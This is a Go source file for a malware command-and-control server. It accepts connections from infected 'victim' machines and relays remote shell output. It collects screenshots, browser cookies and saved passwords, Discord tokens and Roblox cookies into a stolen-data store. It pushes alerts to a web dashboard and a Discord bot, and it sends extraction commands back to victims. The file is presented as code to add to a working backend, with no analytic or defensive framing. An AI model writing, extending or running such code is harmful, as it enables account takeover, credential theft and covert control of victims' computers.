// Enhanced C2 Protocol Handler with Screenshot, Cookies, and Discord Integration
// Add this to your backend/c2server/server_enhanced.go

package c2server

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"time"

	"c2-control-panel/models"
	"c2-control-panel/services"
	"c2-control-panel/websocket"
)

type ServerEnhanced struct {
	*Server // Embed original server
	DiscordBot        *services.DiscordBot
	ScreenshotService *services.ScreenshotService
	StolenDataService *services.StolenDataService
}

func NewServerEnhanced(address string, db *sql.DB, hub *websocket.Hub, 
	discordBot *services.DiscordBot, 
	screenshotService *services.ScreenshotService,
	stolenDataService *services.StolenDataService) *ServerEnhanced {
	
	return &ServerEnhanced{
		Server: &Server{
			Address: address,
			DB:      db,
			Hub:     hub,
			Victims: make(map[string]*VictimSession),
		},
		DiscordBot:        discordBot,
		ScreenshotService: screenshotService,
		StolenDataService: stolenDataService,
	}
}

func (s *ServerEnhanced) Start() error {
	log.Printf("[C2] Starting enhanced TCP listener on %s...", s.Address)
	listener, err := net.Listen("tcp", s.Address)
	if err != nil {
		log.Printf("[C2] Failed to bind to %s: %v", s.Address, err)
		return err
	}
	defer listener.Close()

	log.Printf("[C2] Successfully listening on %s", s.Address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[C2] Accept error: %v", err)
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *ServerEnhanced) handleConnection(conn net.Conn) {
	victimID := conn.RemoteAddr().String()
	now := time.Now()
	log.Printf("[C2] New connection: %s", victimID)

	session := &VictimSession{
		ID:         victimID,
		Conn:       conn,
		Info:       make(map[string]string),
		LastSeen:   now,
		CommandCh:  make(chan *Packet, 10),
		ResponseCh: make(chan *Packet, 10),
	}

	s.mu.Lock()
	s.Victims[victimID] = session
	s.mu.Unlock()

	// Persist victim record
	s.saveVictim(session, now)

	// Notify dashboard via WebSocket
	s.Hub.Broadcast <- []byte(`{"type":"victim_connected","id":"` + victimID + `"}`)
	
	// Notify Discord
	s.DiscordBot.NotifyVictimConnected(victimID, session.Info)

	// Handle packets from victim
	go s.handleIncomingEnhanced(session)

	// Handle commands to victim
	s.handleOutgoing(session)

	// Cleanup on disconnect
	s.mu.Lock()
	delete(s.Victims, victimID)
	s.mu.Unlock()

	s.Hub.Broadcast <- []byte(`{"type":"victim_disconnected","id":"` + victimID + `"}`)
	s.DiscordBot.NotifyVictimDisconnected(victimID)
	log.Printf("[C2] Disconnected: %s", victimID)
}

func (s *ServerEnhanced) handleIncomingEnhanced(session *VictimSession) {
	for {
		packet, err := ReadPacket(session.Conn)
		if err != nil {
			log.Printf("[C2] Read error from %s: %v", session.ID, err)
			session.Conn.Close()
			return
		}

		session.LastSeen = time.Now()

		switch packet.Opcode {
		case CmdHello:
			log.Printf("[C2] Hello from %s: %s", session.ID, string(packet.Data))
			// Parse system info JSON
			var sysInfo map[string]string
			if err := json.Unmarshal(packet.Data, &sysInfo); err == nil {
				session.Info = sysInfo
				s.DiscordBot.NotifyVictimConnected(session.ID, sysInfo)
			}

		case CmdShell:
			log.Printf("[C2] Shell output from %s (%d bytes)", session.ID, len(packet.Data))
			s.logCommand(session.ID, packet.Data)
			// Send to dashboard
			msg := `{"type":"shell_output","id":"` + session.ID + `","output":"` + string(packet.Data) + `"}`
			s.Hub.Broadcast <- []byte(msg)

		case CmdScreenFrame:
			log.Printf("[C2] 📸 Screenshot from %s (%d bytes)", session.ID, len(packet.Data))
			s.handleScreenshot(session.ID, packet.Data)

		case CmdStealBrowser:
			log.Printf("[C2] 🍪 Browser data from %s (%d bytes)", session.ID, len(packet.Data))
			s.handleBrowserData(session.ID, packet.Data)

		case CmdStealDiscord:
			log.Printf("[C2] 💬 Discord tokens from %s (%d bytes)", session.ID, len(packet.Data))
			s.handleDiscordTokens(session.ID, packet.Data)

		case CmdStealRoblox:
			log.Printf("[C2] 🎮 Roblox cookies from %s (%d bytes)", session.ID, len(packet.Data))
			s.handleRobloxCookies(session.ID, packet.Data)

		default:
			log.Printf("[C2] Unknown opcode %d from %s", packet.Opcode, session.ID)
		}
	}
}

// ==================== SCREENSHOT HANDLER ====================

func (s *ServerEnhanced) handleScreenshot(victimID string, jpegData []byte) {
	if len(jpegData) == 0 {
		log.Printf("[Screenshot] Empty screenshot data from %s", victimID)
		return
	}

	// Save screenshot
	screenshot, err := s.ScreenshotService.SaveScreenshot(victimID, jpegData, 1920, 1080, "jpeg")
	if err != nil {
		log.Printf("[Screenshot] Failed to save: %v", err)
		return
	}

	log.Printf("[Screenshot] ✅ Saved screenshot ID %d for %s (%d bytes)", screenshot.ID, victimID, len(jpegData))

	// Notify dashboard
	msg := map[string]interface{}{
		"type":       "screenshot_captured",
		"victim_id":  victimID,
		"screenshot": screenshot,
	}
	msgJSON, _ := json.Marshal(msg)
	s.Hub.Broadcast <- msgJSON

	// Notify Discord with image URL
	imageURL := s.ScreenshotService.BaseURL + "/" + screenshot.Filename
	s.DiscordBot.NotifyScreenshot(victimID, screenshot.Filename, imageURL)
}

// ==================== BROWSER DATA HANDLER ====================

func (s *ServerEnhanced) handleBrowserData(victimID string, jsonData []byte) {
	var data struct {
		Cookies   []models.BrowserCookie   `json:"cookies"`
		Passwords []models.BrowserPassword `json:"passwords"`
	}

	if err := json.Unmarshal(jsonData, &data); err != nil {
		log.Printf("[BrowserData] Failed to parse JSON: %v", err)
		return
	}

	// Save cookies
	if len(data.Cookies) > 0 {
		count, _ := s.StolenDataService.SaveBrowserCookies(victimID, data.Cookies)
		log.Printf("[BrowserData] ✅ Saved %d cookies", count)
	}

	// Save passwords
	if len(data.Passwords) > 0 {
		count, _ := s.StolenDataService.SaveBrowserPasswords(victimID, data.Passwords)
		log.Printf("[BrowserData] ✅ Saved %d passwords", count)
	}

	// Notify dashboard
	summary, _ := s.StolenDataService.GetStolenDataSummary(victimID)
	msg := map[string]interface{}{
		"type":    "browser_data_received",
		"victim_id": victimID,
		"summary": summary,
	}
	msgJSON, _ := json.Marshal(msg)
	s.Hub.Broadcast <- msgJSON
}

// ==================== DISCORD TOKEN HANDLER ====================

func (s *ServerEnhanced) handleDiscordTokens(victimID string, jsonData []byte) {
	var tokens []models.DiscordToken

	if err := json.Unmarshal(jsonData, &tokens); err != nil {
		log.Printf("[Discord] Failed to parse JSON: %v", err)
		return
	}

	if len(tokens) == 0 {
		return
	}

	// Save tokens
	count, _ := s.StolenDataService.SaveDiscordTokens(victimID, tokens)
	log.Printf("[Discord] ✅ Saved %d Discord tokens", count)

	// Notify dashboard
	msg := map[string]interface{}{
		"type":      "discord_tokens_received",
		"victim_id": victimID,
		"count":     count,
	}
	msgJSON, _ := json.Marshal(msg)
	s.Hub.Broadcast <- msgJSON
}

// ==================== ROBLOX COOKIE HANDLER ====================

func (s *ServerEnhanced) handleRobloxCookies(victimID string, jsonData []byte) {
	var cookies []models.RobloxCookie

	if err := json.Unmarshal(jsonData, &cookies); err != nil {
		log.Printf("[Roblox] Failed to parse JSON: %v", err)
		return
	}

	if len(cookies) == 0 {
		return
	}

	// Save cookies
	count, _ := s.StolenDataService.SaveRobloxCookies(victimID, cookies)
	log.Printf("[Roblox] ✅ Saved %d Roblox cookies", count)

	// Notify dashboard
	msg := map[string]interface{}{
		"type":      "roblox_cookies_received",
		"victim_id": victimID,
		"count":     count,
	}
	msgJSON, _ := json.Marshal(msg)
	s.Hub.Broadcast <- msgJSON
}

// ==================== COMMAND SENDERS ====================

// RequestScreenshot sends screenshot capture command to victim
func (s *ServerEnhanced) RequestScreenshot(victimID string) error {
	return s.SendCommand(victimID, CmdScreenStart, []byte{})
}

// RequestBrowserData sends browser data extraction command
func (s *ServerEnhanced) RequestBrowserData(victimID string) error {
	return s.SendBrowserCommand(victimID, CmdStealBrowser, []byte{})
}

// RequestDiscordTokens sends Discord token extraction command
func (s *ServerEnhanced) RequestDiscordTokens(victimID string) error {
	return s.SendBrowserCommand(victimID, CmdStealDiscord, []byte{})
}

// RequestRobloxCookies sends Roblox cookie extraction command
func (s *ServerEnhanced) RequestRobloxCookies(victimID string) error {
	return s.SendBrowserCommand(victimID, CmdStealRoblox, []byte{})
}

// SendBrowserCommand sends a command to the victim
func (s *ServerEnhanced) SendBrowserCommand(victimID string, opcode uint8, data []byte) error {
	s.mu.RLock()
	session, exists := s.Victims[victimID]
	s.mu.RUnlock()

	if !exists {
		return fmt.Errorf("victim %s not connected", victimID)
	}

	return WritePacket(session.Conn, opcode, data)
}
